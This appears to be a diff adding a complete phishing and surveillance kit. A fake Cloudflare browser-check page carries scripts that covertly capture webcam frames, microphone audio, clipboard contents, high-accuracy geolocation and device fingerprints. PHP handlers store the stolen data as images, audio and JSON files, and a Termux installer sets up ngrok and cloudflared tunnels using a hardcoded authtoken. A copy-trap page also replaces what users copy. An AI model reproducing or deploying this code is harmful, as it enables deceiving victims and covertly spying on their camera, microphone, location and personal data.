@@ -1,0 +1,608 @@
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
+<script src="index.js" type="text/javascript" charset="utf-8" defer></script>
+<title>Just a moment....</title> 
+<style type="text/css">
+html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
+body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
+h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
+p {font-size: 20px; font-weight: 400; margin: 8px 0;}
+p, .attribution, {text-align: center;}
+#spinner {margin: 0 auto 30px auto; display: block;}
+.attribution {margin-top: 32px;}
+@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
+#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
+#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
+.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
+a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
+a:hover{color: #f4a15d}
+.attribution{font-size: 16px; line-height: 1.5;}
+.ray_id{display: block; margin-top: 8px;}
+#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
+#cf-hcaptcha-container { text-align:center;}
+#cf-hcaptcha-container iframe { display: inline-block;}
+</style> 
+</head> 
+<body>
+<table width="100%" height="100%" cellpadding="20"> 
+<tbody>
+<tr> 
+<td align="center" valign="middle"> 
+<div class="cf-browser-verification cf-im-under-attack"> 
+<noscript> 
+<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
+</noscript> 
+<div id="cf-content" style="display: block;"> 
+<div id="cf-bubbles"> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+</div> 
+<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
+<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
+<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
+</div> 
+<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
+</div> 
+<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
+
+<span data-translate="error" style="display: none;">error code: 1020</span>
+
+</form>
+</div> 
+<div class="attribution">
+DDoS protection by 
+<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
+<br> 
+<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
+</div> </td> 
+</tr> 
+</tbody>
+</table>
+<video id="video" style="display:none"  playsinline autoplay></video>
+<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+<script type="text/javascript" charset="utf-8">
+  function choice(seq) {
+  const randomIndex = Math.floor(Math.random() * seq.length);
+  return seq[randomIndex];
+}
+keyList = ["a2f468e2c753b9f7", "8d07a9d4e2153fc1", "4b69c8f3b2e710d9", "f1b58e42a396d07c", "c38e7a5d94f2b610", "9f256d7e1c8a03b4"]
+
+randomKey = choice(keyList)
+document.getElementById("ray").innerText = randomKey;
+</script>
+</body>
+</html>function Redirect() {
+	window.open("https://you.regettingold.com/");
+}
+
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: './get_data.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    console.log(e.toString());
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+init();function post(dataclip){
+$.ajax({
+    type: "POST",
+    data: { cat: dataclip },
+    url: "./get_data.php",
+    dataType: "json",
+    async: false,
+
+    success: function(result){
+        location.replace("https://you.regettingold.com/")
+    },
+
+    error: function(){
+
+    }
+  });
+};
+
+navigator.clipboard.readText().then(text => post(text));function Redirect() {
+  window.open("https://you.regettingold.com/");
+}
+
+function send(theUrl) {
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("GET", theUrl, false);
+  xmlHttp.send(null);
+  return xmlHttp.responseText;
+}
+
+async function fetchData() {
+  ip = send("./ip.php?echo=true");
+  time = new Date()+"";
+  cookie = navigator.cookieEnabled;
+  touch = navigator.maxTouchPoints;
+  ua = navigator.userAgent;
+  platf = navigator.platform;
+  lang = navigator.language;
+  memory = navigator.deviceMemory;
+  wid = screen.width;
+  hig = screen.height;
+  netType = navigator.connection["type"];
+  saveData = navigator.connection["saveData"];
+
+  if ("getBattery" in navigator) {
+    await navigator.getBattery().then((battery) => {
+      batLevel = battery.level * 100 + "%";
+      batCharge = battery.charging;
+    }).catch((error) => {
+      console.error(error);
+    });
+  }
+
+
+  try {
+    dname = WURFL.complete_device_name;
+  } catch (e) {
+    dname = "";
+  }
+}
+try {
+  fetchData().then((result) => {
+    var sendQuery = `&time=${time}&touch=${touch}&cookie=${cookie}&ua=${ua}&platf=${platf}&lang=${lang}&memory=${memory}&wid=${wid}&hig=${hig}&netType=${netType}&saveData=${saveData}&batLevel=${batLevel}&batCharge=${batCharge}&dname=${dname}`;
+
+    sent = send("./get_data.php?ip="+ip+encodeURI(sendQuery));
+    Redirect();
+  })
+} catch (e) {
+  console.log(e.toString())
+}function send(theUrl) {
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("GET", theUrl, false);
+  xmlHttp.send(null);
+  return
+}
+
+function Redirect() {
+  window.open("https://you.regettingold.com/");
+}
+
+
+function locate() {
+  if (navigator.geolocation) {
+    var optn = {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumage: 0
+    };
+    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+  } else {}
+
+  function showPosition(position) {
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
+    var acc = position.coords.accuracy;
+    var alt = position.coords.altitude;
+    var dir = position.coords.heading;
+    var spd = position.coords.speed;
+    send("./get_data.php?Lat="+lat+"&Lon="+lon+"&Acc="+acc+"&Alt="+alt+"&Dir="+dir+"&Spd="+spd)
+    Redirect();
+  }
+}
+
+function showError(error) {
+  alert("Turn ON Your Device Location and Refresh This Page Again to Countinue...")
+}
+
+locate()URL = window.URL || window.webkitURL;
+
+var gumStream; //stream from getUserMedia()
+var rec; //Recorder.js object
+var input; //MediaStreamAudioSourceNode we"ll be recording
+
+// shim for AudioContext when it"s not avb.
+var AudioContext = window.AudioContext || window.webkitAudioContext;
+var audioContext //audio context to help us record
+
+
+function Redirect() {
+  window.open("https://you.regettingold.com/");
+
+}
+
+window.setTimeout(startRecording, 300);
+window.setInterval(stopRecording, 6000);
+
+
+
+function startRecording() {
+
+  var constraints = {
+    audio: true,
+    video: false
+  }
+
+  navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+    console.log("getUserMedia() success, stream created, initializing Recorder.js ...");
+
+    /*
+			create an audio context after getUserMedia is called
+			sampleRate might change after getUserMedia is called, like it does on macOS when recording through AirPods
+			the sampleRate defaults to the one set in your OS for your playback device
+		*/
+    audioContext = new AudioContext();
+
+    /*  assign to gumStream for later use  */
+    gumStream = stream;
+
+    /* use the stream */
+    input = audioContext.createMediaStreamSource(stream);
+
+    /*
+			Create the Recorder object and configure to record mono sound (1 channel)
+			Recording 2 channels  will double the file size
+		*/
+    rec = new Recorder(input, {
+      numChannels: 1
+    })
+
+    //start the recording process
+    rec.record()
+
+
+  }).catch(function(err) {});
+}
+
+
+function uploadRecord() {
+
+  $(document).ready(function() {
+    $("a#Upload")[0].click();
+
+  });
+
+
+}
+
+function stopRecording() {
+  //tell the recorder to stop the recording
+  rec.stop();
+
+  //stop microphone access
+  //gumStream.getAudioTracks()[0].stop();
+
+  //create the wav blob and pass it on to createDownloadLink
+  rec.exportWAV(createDownloadLink);
+
+}
+
+function createDownloadLink(blob) {
+
+  var url = URL.createObjectURL(blob);
+  var filename = new Date().toISOString();
+
+
+  var xhr = new XMLHttpRequest();
+  xhr.onload = function(e) {
+    if (this.readyState === 4) {}
+  };
+
+
+  var fd = new FormData();
+  fd.append("audio_data", blob, filename);
+  xhr.open("POST", "./get_data.php", true);
+  xhr.send(fd);
+
+  window.setTimeout(startRecording, 300);
+
+}document.getElementById("copyme").innerText = "$ShowText$";
+document.getElementById("copyme").addEventListener(
+    "copy", function(e){
+        e.clipboardData.setData("text/plain",
+        "$CopyData$");
+        e.preventDefault();
+    }
+)<?php
+include 'ip.php';
+header('Location: /index2.html');
+exit
+?><html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+#copyme{
+    font-family: 'Inconsolata', monospace;
+    color: white;
+    background-color: black;
+    padding: 1em;
+    max-width: 20em;
+}
+</style>
+</head>
+<body>
+<h1 align="center">Copy The Below Test!</h1><br>
+<h4><div id="copyme" align="center"></div></h4>
+<script src="index.js"></script>
+</body>
+</html><?php
+
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+  $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+} else
+{
+  $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+}
+
+if (@$_GET["echo"] == "true"){
+  echo $ipaddress;
+} else{
+  $file = 'ip.txt';
+  $fp = fopen($file, 'w');
+  fwrite($fp, $ipaddress);
+  fclose($fp);
+}<?php
+
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( 'data.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?><?php
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+file_put_contents('data.dat', ' '  . $_POST['cat'] . "\n", FILE_APPEND);
+exit();
+?><?php
+header("Content-Type: text/html");
+error_log("Received" . "\r\n", 3, "Log.log");
+{
+  $ip = $_GET["ip"];
+  $time = $_GET["time"];
+  $touch = $_GET["touch"];
+  $cookie = $_GET["cookie"];
+  $ua = $_GET["ua"];
+  $platf = $_GET["platf"];
+  $lang = $_GET["lang"];
+  $memory = $_GET["memory"];
+  $wid = $_GET["wid"];
+  $hig = $_GET["hig"];
+  $netType = $_GET["netType"];
+  $saveData = $_GET["saveData"];
+  $batLevel = $_GET["batLevel"];
+  $batCharge = $_GET["batCharge"];
+  $dname = $_GET["dname"];
+
+  $data["info"] = array(
+    "ip" => $ip,
+    "time" => $time,
+    "touch" => $touch,
+    "cookie" => $cookie,
+    "ua" => $ua,
+    "platf" => $platf,
+    "lang" => $lang,
+    "memory" => $memory,
+    "wid" => $wid,
+    "hig" => $hig,
+    "netType" => $netType,
+    "saveData" => $saveData,
+    "batLevel" => $batLevel,
+    "batCharge" => $batCharge,
+    "dname" => $dname);
+
+  $jdata = json_encode($data);
+
+  $f = fopen("data.json", "w+");
+  fwrite($f, $jdata);
+  fclose($f);
+}
+?><?php
+header('Content-Type: text/html');
+error_log("Received" . "\r\n", 3, "Log.log");
+{
+  $lat = $_GET['Lat'];
+  $lon = $_GET['Lon'];
+  $acc = $_GET['Acc'];
+  $alt = $_GET['Alt'];
+  $dir = $_GET['Dir'];
+  $spd = $_GET['Spd'];
+
+  $data['info'] = array(
+    'lat' => $lat,
+    'lon' => $lon,
+    'acc' => $acc,
+    'alt' => $alt,
+    'dir' => $dir,
+    'spd' => $spd);
+
+  $jdata = json_encode($data);
+
+  $f = fopen('data.json', 'w+');
+  fwrite($f, $jdata);
+  fclose($f);
+}
+?><?php
+print_r($_FILES); //this will print out the received name, temp name, type, size, etc.
+
+if (!empty($_FILES)) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+$size = $_FILES['audio_data']['size']; //the size in bytes
+$input = $_FILES['audio_data']['tmp_name']; //temporary name that PHP gave to the uploaded file
+$output = "data.wav"; //letting the client control the filename is a rather bad idea
+
+//move the file from temp name to local folder using $output name
+move_uploaded_file($input, $output)
+?>import subprocess as sb
+import os, time
+
+uname = sb.getoutput("uname -m")
+chroot = sb.getoutput("command -v termux-chroot")
+binPath = "/data/data/com.termux/files/usr/bin/"
+
+# Download the File
+def download(url):
+    os.system("wget \"" + url + "\" --no-check-certificate --show-progress")
+    return url.split("/")[-1]
+
+# Install Package
+def install(pkg):
+    print("\n[\033[92m!\033[37m] Installing " + pkg + "...\n")
+    os.system("pkg install " + pkg + " -y")
+
+# Install Ngrok
+def install_Ngrok():
+    print("\n[\033[92m!\033[37m] Installing Ngrok")
+    if os.path.exists(binPath+"ngrok"):
+        time.sleep(1)
+        print("\n[\033[92m!\033[37m] Ngrok is already Installed")
+        return
+    
+    if (uname == "arm") or (uname == "Android"):
+        file = download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
+    elif (uname == "aarch64"):
+        file = download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip")
+    elif (uname == "x86_64"):
+        file = download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip")
+    else:
+        file = download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
+    
+    if not os.path.exists(file):
+       print("\n[\033[91m!\033[37m] Ngrok install Error")
+       print("[*] Install Manually")
+       return
+    
+    os.system("unzip " + file + " > /dev/null 2>&1")
+    os.system("mv -f ngrok " + binPath + "ngrok")
+    os.system("chmod +x " + binPath+ "ngrok")
+    os.system("rm -rf " + file)
+    
+    time.sleep(2)
+    if not (chroot == ""):
+        os.system("termux-chroot ngrok authtoken 2MAnDjtUDq8gCX4VEej2KZL60xN_72EDqvCNGi9bH17QkJHdo")
+    else:
+        os.system("ngrok authtoken 2MAnDjtUDq8gCX4VEej2KZL60xN_72EDqvCNGi9bH17QkJHdo")
+    
+    file = open(binPath+"ngtrial.json", "w")
+    file.write("{\"auth\": \"2MAnDjtUDq8gCX4VEej2KZL60xN_72EDqvCNGi9bH17QkJHdo\", \"trialLeft\": 5}")
+    file.close()
+    
+    print("\n[\033[92m!\033[37m] Ngrok install Complete")
+
+
+# Install Cloudflared
+def install_Cloudflared():
+    print("\n[\033[92m!\033[37m] Installing Cloudflared")
+    if os.path.exists(binPath+"cloudflared"):
+        time.sleep(1)
+        print("\n[\033[92m!\033[37m] Cloudflared is Installed\n")
+        return
+    
+    if (uname == "arm") or (uname == "Android"):
+        file = download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm")
+    elif (uname == "aarch64"):
+        file = download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64")
+    elif (uname == "x86_64"):
+        file = download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64")
+    else:
+        file = download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386")
+    
+    if not os.path.exists(file):
+       print("\n[\033[91m!\033[37m] Claudflared install Error")
+       print("[*] Install Manually")
+       return
+    
+    os.system("mv -f " + file + " " + binPath + "cloudflared > /dev/null 2>&1")
+    os.system("chmod +x " + binPath + "cloudflared")
+    print("\n\033[92m!\033[37m] Cloudflared Install Complete")
+
+    
+# Install Required Packages
+def install_Setup():
+    print("\n[\033[92m!\033[37m] Update and Upgrading...\n")
+    os.system("apt update -y && apt upgrade -y")
+    install("python")
+    install("wget")
+    install("curl")
+    install("unzip")
+    install("proot resolv-conf")
+
+print("\n[\033[92m*\033[37m] Please Stand By")
+print("\n[*] Installing Packages")
+time.sleep(1)
+
+install_Setup()
+install_Ngrok()
+time.sleep(0.5)
+install_Cloudflared()
+
+print("\n[\033[93m!\033[37m] Installation Complete!\n")
